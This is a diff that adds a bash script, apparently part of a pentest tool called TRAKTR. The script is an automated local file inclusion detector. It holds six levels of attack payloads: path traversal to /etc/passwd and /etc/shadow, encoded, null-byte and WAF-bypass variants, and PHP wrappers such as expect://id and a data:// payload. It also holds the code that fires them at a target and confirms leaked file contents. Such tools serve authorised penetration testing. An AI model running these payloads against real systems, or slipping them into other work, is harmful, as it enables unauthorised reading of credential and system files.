@@ -1,0 +1,311 @@
+#!/usr/bin/env bash
+# TRAKTR Smart LFI Detection Engine v1.0
+# 6-level escalation, multi-signal validation, WAF bypass chains
+# Usage: source lfi_engine.sh; detect_lfi <url> <param> <method>
+
+# ── LFI Payload Levels ──────────────────────────────────────────────────────
+_lfi_level1() {
+  # Basic traversal (always run)
+  cat << 'EOF'
+../../../../etc/passwd
+../../../etc/passwd
+../../etc/passwd
+../../../../etc/hosts
+/etc/passwd
+/etc/hosts
+../../../../windows/win.ini
+..\..\..\..\windows\win.ini
+../../../../boot.ini
+EOF
+}
+
+_lfi_level2() {
+  # Encoded/bypass traversal (ordered by success probability)
+  cat << 'EOF'
+....//....//....//....//etc/passwd
+..;/..;/..;/..;/etc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%5c..%5c..%5c..%5cetc/passwd
+..%2f..%2f..%2f..%2fwindows/win.ini
+%252e%252e%252fetc/passwd
+..%e0%80%af..%e0%80%afetc/passwd
+....//....//....//....//windows/win.ini
+....\/....\/....\/....\/etc/passwd
+EOF
+}
+
+_lfi_level3() {
+  # Null byte + truncation
+  cat << 'EOF'
+../../../../etc/passwd%00
+../../../../etc/passwd%00.html
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.php
+....//....//....//etc/passwd%00
+../../../../etc/passwd%2500
+EOF
+  # Path truncation (long string)
+  printf '../../../../etc/passwd'; printf '.%.0s' {1..256}; echo
+}
+
+_lfi_level4_php() {
+  # PHP wrappers (only if PHP detected)
+  cat << 'EOF'
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=config
+php://filter/convert.base64-encode/resource=../config
+php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd
+expect://id
+EOF
+  # data:// and phar:// are potentially destructive -- skip in OSCP
+  if [[ "${OSCP:-false}" != true ]]; then
+    echo "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+    echo "phar://test.phar"
+  fi
+}
+
+_lfi_level5() {
+  # OS-specific deep paths
+  cat << 'EOF'
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/version
+/proc/self/status
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/nginx/access.log
+/var/log/httpd/access_log
+/var/log/auth.log
+/var/log/syslog
+/etc/shadow
+/etc/hostname
+/etc/issue
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\inetpub\wwwroot\web.config
+..\..\..\..\windows\system.ini
+WEB-INF/web.xml
+META-INF/MANIFEST.MF
+EOF
+}
+
+_lfi_level6_waf_bypass() {
+  # WAF bypass encoding chains
+  cat << 'EOF'
+....\/....\/....\/....\/etc/passwd
+..../..../..../..../etc/passwd
+..%00/..%00/..%00/..%00/etc/passwd
+/%5C../%5C../%5C../%5C../etc/passwd
+\..\\..\\..\\..\\etc/passwd
+..%u2215..%u2215..%u2215etc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+..%bg%qf..%bg%qf..%bg%qfetc/passwd
+..0x2f..0x2f..0x2f..0x2fetc/passwd
+EOF
+}
+
+# ── Content signatures ──────────────────────────────────────────────────────
+_lfi_check_signatures() {
+  local file="$1"
+  [[ ! -f "$file" ]] && return 1
+  # Unix
+  grep -qP 'root:[x*]:0:|daemon:[x*]:' "$file" 2>/dev/null && { echo "unix_passwd"; return 0; }
+  # Windows
+  grep -qP '\[extensions\]|\[fonts\]' "$file" 2>/dev/null && { echo "win_ini"; return 0; }
+  grep -q 'boot loader\|operating systems' "$file" 2>/dev/null && { echo "boot_ini"; return 0; }
+  # PHP source (from wrappers)
+  grep -qP 'PD9waH|PD9QSFA|PD9waHA' "$file" 2>/dev/null && { echo "php_base64"; return 0; }
+  grep -q '<?php\|<?=' "$file" 2>/dev/null && { echo "php_source"; return 0; }
+  # Proc filesystem
+  grep -qP 'DOCUMENT_ROOT=|HTTP_HOST=|PATH=' "$file" 2>/dev/null && { echo "proc_environ"; return 0; }
+  grep -qP '/usr/sbin|/bin/bash|/bin/sh' "$file" 2>/dev/null && { echo "proc_cmdline"; return 0; }
+  # Log files
+  grep -qP 'GET /|POST /|HTTP/1\.' "$file" 2>/dev/null && { echo "log_file"; return 0; }
+  # web.xml / web.config
+  grep -q '<web-app\|<configuration\|<servlet' "$file" 2>/dev/null && { echo "config_file"; return 0; }
+  return 1
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  MAIN LFI DETECTION FUNCTION
+# ═══════════════════════════════════════════════════════════════════════════
+detect_lfi() {
+  local url="$1" param="$2" method="${3:-GET}"
+  local framework="${FRAMEWORK:-generic}" waf="${WAF_DETECTED:-none}"
+  local oscp="${OSCP:-false}" outdir="${OUTDIR:-/tmp}"
+  local max_per_level=50 abort_after=5
+
+  # ── STEP 1: BASELINE ──
+  local baseline_file; baseline_file=$(mktemp "${outdir}/lfi_baseline_XXXXX")
+  local baseline_metrics
+  baseline_metrics=$(_lfi_request "$url" "$param" "traktr_safe_canary_value" "$method" "$baseline_file")
+  local baseline_status baseline_size baseline_time
+  IFS='|' read -r baseline_status baseline_size baseline_time <<< "$baseline_metrics"
+
+  # ── STEP 2: LEVEL-BY-LEVEL TESTING ──
+  local confirmed=false best_payload="" best_confidence="" best_signals=0 best_signal_list="" best_proof="" best_encoding=""
+  local consecutive_misses=0 requests_this_level=0
+
+  _run_level() {
+    local level_name="$1" level_num="$2"
+    shift 2
+    consecutive_misses=0; requests_this_level=0
+
+    while IFS= read -r payload; do
+      [[ -z "$payload" ]] && continue
+      ((requests_this_level++)) || true
+      [[ $requests_this_level -gt $max_per_level ]] && break
+
+      local resp_file; resp_file=$(mktemp "${outdir}/lfi_resp_XXXXX")
+      local metrics
+      metrics=$(_lfi_request "$url" "$param" "$payload" "$method" "$resp_file")
+      local resp_status resp_size resp_time
+      IFS='|' read -r resp_status resp_size resp_time <<< "$metrics"
+
+      # Multi-signal check
+      local signals=0 signal_list=""
+
+      # Signal A: Content signature match
+      local sig_type
+      if sig_type=$(_lfi_check_signatures "$resp_file"); then
+        ((signals++)) || true
+        signal_list+="content_match(${sig_type}),"
+      fi
+
+      # Signal B: Size delta
+      local delta=$(( ${resp_size:-0} - ${baseline_size:-0} ))
+      if [[ ${delta#-} -gt 200 ]]; then
+        ((signals++)) || true
+        signal_list+="length_delta(${delta}),"
+      fi
+
+      # Signal C: Time delta
+      if [[ -n "$resp_time" ]] && [[ -n "$baseline_time" ]]; then
+        local slow; slow=$(awk "BEGIN{if($baseline_time>0 && $resp_time/$baseline_time>=2.0) print 1; else print 0}" 2>/dev/null) || true
+        [[ "$slow" == "1" ]] && { ((signals++)) || true; signal_list+="time_delta,"; }
+      fi
+
+      # Signal D: Status change
+      if [[ "$resp_status" != "$baseline_status" ]]; then
+        ((signals++)) || true
+        signal_list+="status_change(${baseline_status}->${resp_status}),"
+      fi
+
+      # Evaluate
+      if [[ $signals -ge 1 ]]; then
+        consecutive_misses=0
+        if [[ $signals -gt $best_signals ]]; then
+          best_signals=$signals
+          best_payload="$payload"
+          best_encoding="$level_name"
+          best_signal_list="${signal_list%,}"
+          best_proof=$(grep -oP -m1 'root:[x*]:0:[^\n]{0,60}|\[extensions\][^\n]{0,40}|PD9waH[^\n]{0,40}|DOCUMENT_ROOT=[^\n]{0,40}|<\?php[^\n]{0,40}' "$resp_file" 2>/dev/null | head -1 || echo "size_delta=$delta")
+          [[ $signals -ge 2 ]] && { confirmed=true; rm -f "$resp_file"; return 0; }
+        fi
+      else
+        ((consecutive_misses++)) || true
+        [[ $consecutive_misses -ge $abort_after ]] && { rm -f "$resp_file"; return 1; }
+      fi
+
+      rm -f "$resp_file"
+    done
+
+    return 1
+  }
+
+  # Run levels in escalating order
+  _run_level "basic_traversal" 1 < <(_lfi_level1) && confirmed=true || true
+  if ! $confirmed; then
+    _run_level "encoded_traversal" 2 < <(_lfi_level2) && confirmed=true || true
+  fi
+  if ! $confirmed; then
+    _run_level "null_byte" 3 < <(_lfi_level3) && confirmed=true || true
+  fi
+  # Level 4: PHP wrappers only if PHP detected
+  if ! $confirmed && [[ "$framework" =~ ^(php|wordpress|laravel|drupal|joomla|symfony)$ ]]; then
+    _run_level "php_wrapper" 4 < <(_lfi_level4_php) && confirmed=true || true
+  fi
+  if ! $confirmed; then
+    _run_level "os_deep_paths" 5 < <(_lfi_level5) && confirmed=true || true
+  fi
+  # Level 6: WAF bypass (only if WAF detected and nothing found yet)
+  if ! $confirmed && [[ "$waf" != "none" ]]; then
+    _run_level "waf_bypass" 6 < <(_lfi_level6_waf_bypass) && confirmed=true || true
+  fi
+
+  rm -f "$baseline_file"
+
+  # ── STEP 3: DEPTH ESCALATION ──
+  local found_depth=""
+  if $confirmed || [[ $best_signals -ge 1 ]]; then
+    # Try to find minimum working depth
+    if [[ "$best_payload" == *".."* ]]; then
+      for d in 1 2 3 4 5 6 7 8 9 10 12 15; do
+        local traversal=""
+        for ((i=0; i<d; i++)); do traversal+="../"; done
+        local depth_payload="${traversal}etc/passwd"
+        local depth_file; depth_file=$(mktemp "${outdir}/lfi_depth_XXXXX")
+        _lfi_request "$url" "$param" "$depth_payload" "$method" "$depth_file" > /dev/null
+        if _lfi_check_signatures "$depth_file" > /dev/null 2>&1; then
+          found_depth=$d
+          rm -f "$depth_file"
+          break
+        fi
+        rm -f "$depth_file"
+      done
+    fi
+  fi
+
+  # ── STEP 4: OUTPUT ──
+  if [[ $best_signals -ge 1 ]]; then
+    local confidence="LOW"
+    [[ $best_signals -ge 2 ]] && confidence="HIGH"
+    [[ $best_signals -eq 1 ]] && confidence="MEDIUM"
+    local prefix=""; [[ "$oscp" == true ]] && prefix="POTENTIAL "
+    local curl_cmd; curl_cmd=$(build_curl_command "$url" "$method" "$param" "$best_payload" 2>/dev/null || echo "curl -sk '${url}?${param}=$(encode_payload "$best_payload" url 2>/dev/null || echo "$best_payload")'")
+    local next_steps; next_steps=$(suggest_next_step "lfi" "$framework" 2>/dev/null | head -3 | tr '\n' ' ') || true
+
+    # JSON output
+    cat << LFIEOF
+{"type":"${prefix}lfi","url":"$url","param":"$param","method":"$method","depth":${found_depth:-0},"encoding":"$best_encoding","payload":"$(echo "$best_payload" | sed 's/"/\\"/g')","signal_count":$best_signals,"signals":"$best_signal_list","confidence":"$confidence","proof":"$(echo "$best_proof" | sed 's/"/\\"/g' | head -c 100)","curl":"$(echo "$curl_cmd" | sed 's/"/\\"/g')","next_steps":"$next_steps","framework":"$framework","waf":"$waf"}
+LFIEOF
+
+    # Terminal alert
+    echo -e "\033[1;33m  [!!] LFI: ${url} (${param}) [$confidence] signals=${best_signals} encoding=${best_encoding}${found_depth:+ depth=$found_depth}\033[0m" >&2
+  fi
+}
+
+# ── HTTP request helper (returns status|size|time) ──────────────────────────
+_lfi_request() {
+  local url="$1" param="$2" payload="$3" method="${4:-GET}" outfile="$5"
+  local encoded; encoded=$(encode_payload "$payload" url 2>/dev/null || echo "$payload")
+
+  local target_url
+  if [[ "$method" == "GET" ]]; then
+    if [[ "$url" == *"?"* ]]; then
+      target_url="${url}&${param}=${encoded}"
+    else
+      target_url="${url}?${param}=${encoded}"
+    fi
+  else
+    target_url="$url"
+  fi
+
+  local metrics
+  if [[ "$method" == "GET" ]]; then
+    metrics=$(_curl "$target_url" -o "$outfile" -w '%{http_code}|%{size_download}|%{time_total}' 2>/dev/null) || metrics="000|0|0"
+  else
+    metrics=$(_curl "$target_url" -X POST -d "${param}=${encoded}" -o "$outfile" -w '%{http_code}|%{size_download}|%{time_total}' 2>/dev/null) || metrics="000|0|0"
+  fi
+
+  echo "$metrics"
+}
